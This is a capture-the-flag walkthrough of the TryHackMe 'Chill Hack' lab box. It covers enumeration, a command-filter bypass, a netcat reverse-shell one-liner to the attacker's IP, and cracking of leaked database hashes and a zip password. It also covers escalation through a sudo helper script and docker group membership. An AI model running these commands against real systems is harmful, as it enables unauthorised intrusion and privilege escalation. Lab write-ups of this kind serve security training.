---
published: true
image: 'https://imgur.com/TjIgc6p.png'
title: Chill Hack - TryHackMe Walkthrough
author: f3dai
category: Writeup
---
Chill Hack - "This room provides the real world pentesting challenges. Easy level CTF.  Capture the flags and have fun!" This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [Chill Hack](https://tryhackme.com/room/chillhack)

**Difficulty:** Easy

**Author:** Anurodh

## Enumeration

Let's start by adding "chill.thm" to our etc /etc/hosts file. 

Let's run a port scan: 

<pre>nmap -v -sV -sS -p- -T4 -sC -oN portscan chill.thm</pre>

We discover ports 21, 22 and 80 are open. 

<pre>PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.98.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
</pre>

I always go for the easy first - let's check out the ftp server which has **Anonymous FTP login allowed**.

Notice how the portscan says there is a timeout, so let's bare this in mind - be quick.

<pre>┌─[user@parrot]─[~/tryhackme/Chill]
└──╼ $ftp chill.thm
Connected to chill.thm.
220 (vsFTPd 3.0.3)
Name (chill.thm:user): Anonymous 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; passive
Passive mode on.
ftp&gt; ls
227 Entering Passive Mode (10,10,255,139,69,85).
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
ftp&gt; get note.txt
local: note.txt remote: note.txt
227 Entering Passive Mode (10,10,255,139,103,250).
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (39.5369 kB/s)
ftp&gt;</pre>

**note.txt:**

<pre>Anurodh told me that there is some filtering on strings being put in the command -- Apaar</pre>

Two potential usernames: Anurodh and Apaar. There is a mention of sanitising an input so this could give us an idea of what we want to exploit.

Let's checkout port 80:

![port 80](https://imgur.com/E6aMIo9.png)

Let's do a portscan:

<pre>┌─[user@parrot]─[~]
└──╼ $wfuzz -u http://chill.thm//FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt -c --hc 404,403

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://chill.thm//FUZZ
Total requests: 3024

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000740:   301        9 L      28 W     304 Ch      "css"          
000001085:   301        9 L      28 W     306 Ch      "fonts"        
000001337:   301        9 L      28 W     307 Ch      "images"       
000001474:   301        9 L      28 W     303 Ch      "js"           
000002402:   301        9 L      28 W     307 Ch      "secret" </pre>

Let's checkout "secret":

![secret](https://imgur.com/CECjkyw.png)

I try some commands and it seems to not like reverse shells and commands like "ls". Some more testing shows how only the word is being sanitised, so if we go like this:

<pre>whoami;cat /etc/passwd</pre>

We get a result. We can use this to execute our own commands. I tried the following:

<pre>echo "";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.6.65 4444 >/tmp/f</pre>

We get a reverse shell as www-data. Some quick enumeration in the website files, I see some mysql config credentials in /var/www/files/index.php:

<pre>$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");</pre>

Let's see if we can see the entries and crack them?

<pre>mysql -u root -p 
!@m+her00+@db
use webportal
select * from users</pre>

And we get:

<pre>| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+</pre>

Let's see if we can crack these md5 hash passwords on crackstation:

<pre>7e53614ced3640d5de23f111806cc4fd	md5	masterpassword
686216240e5af30df0501e53c789a649	md5	dontaskdonttell</pre>

Tried these passwords but didn't get anything interesting so we continue with some more enumeration like checking our sudo privileges:

<pre>www-data@ubuntu:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
</pre>

This shows us that we can run helpline.sh as apaar. Let's take a look at the script:

<pre>#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
</pre>

It looks like it can execute our $msg. Let's try running "id":

<pre>www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: ur mum
Hello user! I am ur mum,  Please enter your message: id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!</pre>

It's executing as apaar. We can get some sort of shell now as that user. 

Let's try executing /bin/bash:

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: d
Hello user! I am d,  Please enter your message: /bin/bash</pre>

And we have upgraded to the user.

I add my ssh key in for ease. 

I go through some of my routine enumeration. I saw earlier a docker container as an interface so I wanted to check out more networking, to see what's going on.

<pre>apaar@ubuntu:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.255.139:68        0.0.0.0:*                           -                   
</pre>

It looks like there are a couple of ports we may want to check out that are only listening for internal connections. 

<pre>curl 127.0.0.1:9001</pre>

The above shows there is a web server so let's forward the port using ssh:

[ssh port forwarding](https://www.ssh.com/ssh/tunneling/example)

I'm going to create a key on the box and enter it on my local machine auth keys. 

<pre>ssh -R 9001:localhost:9001 root@10.9.6.63</pre>

Now we can browse to localhost:9001 on our local machine and see this:

![port forward](https://imgur.com/Ox8hTeC.png)

If we use the creds we found before we are sent to this php page:

![hacker](https://imgur.com/1T3sECw.png)

"look in the dark" - maybe this is steg?

<pre>wget http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg

root@F3dai:~/TryHackMe/chill# steghide info hacker-with-laptop_23-2147985341.jpg 
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
</pre>

A compressed file is found in this file with no password so let's extract:

<pre>steghide extract -sf hacker-with-laptop_23-2147985341.jpg</pre>

This is password protected so maybe we can brute this?

<pre>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
PASSWORD FOUND!!!!: pw == pass1word</pre>

We get a php file called **source_code.php**:

<pre>&lt;html&gt;
&lt;head&gt;
        Admin Portal
&lt;/head&gt;
        &lt;title&gt; Site Under Development ... &lt;/title&gt;
        &lt;body&gt;
                &lt;form method=&quot;POST&quot;&gt;
                        Username: &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;username&quot;&gt;&lt;br&gt;&lt;br&gt;
                        Email: &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;email&quot;&gt;&lt;br&gt;&lt;br&gt;
                        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;password&quot;&gt;
                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt; 
                &lt;/form&gt;
&lt;?php
        if(isset($_POST['submit']))
        {
                $email = $_POST[&quot;email&quot;];
                $password = $_POST[&quot;password&quot;];
                if(base64_encode($password) == &quot;IWQwbnRLbjB3bVlwQHNzdzByZA==&quot;)
                { 
                        $random = rand(1000,9999);?&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
                        &lt;form method=&quot;POST&quot;&gt;
                                Enter the OTP: &lt;input type=&quot;number&quot; name=&quot;otp&quot;&gt;
                                &lt;input type=&quot;submit&quot; name=&quot;submitOtp&quot; value=&quot;Submit&quot;&gt;
                        &lt;/form&gt;
                &lt;?php   mail($email,&quot;OTP for authentication&quot;,$random);
                        if(isset($_POST[&quot;submitOtp&quot;]))
                                {
                                        $otp = $_POST[&quot;otp&quot;];
                                        if($otp == $random)
                                        {
                                                echo &quot;Welcome Anurodh!&quot;;
                                                header(&quot;Location: authenticated.php&quot;);
                                        }
                                        else
                                        {
                                                echo &quot;Invalid OTP&quot;;
                                        }
                                }
                }
                else
                {
                        echo &quot;Invalid Username or Password&quot;;
                }
        }
?&gt;
&lt;/html&gt;</pre>

We can see:

<pre>if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")</pre>

Decode this:

<pre>echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd</pre>

I try to use this on the website but no luck, so I try changing the user to anurodh on the machine and it works.

I enumerated some more and found that this user can run docker. I only thought of this as I saw it earlier when I was enumerating. 

I also know that from my previous experience with docker, a user should not have access to it as it can be exploited to escalate privs. 

[Docker privesc](https://www.hackingarticles.in/docker-privilege-escalation/)

If we look at the images that are on our system, we see alpine:

<pre>docker images</pre>

So we can essentially run this container and mount it to root like so:

<pre>docker run -v /root:/mnt -it alpine</pre>

We are in the container, in the / directory. If we navigate to /mnt we can see our last flag :).





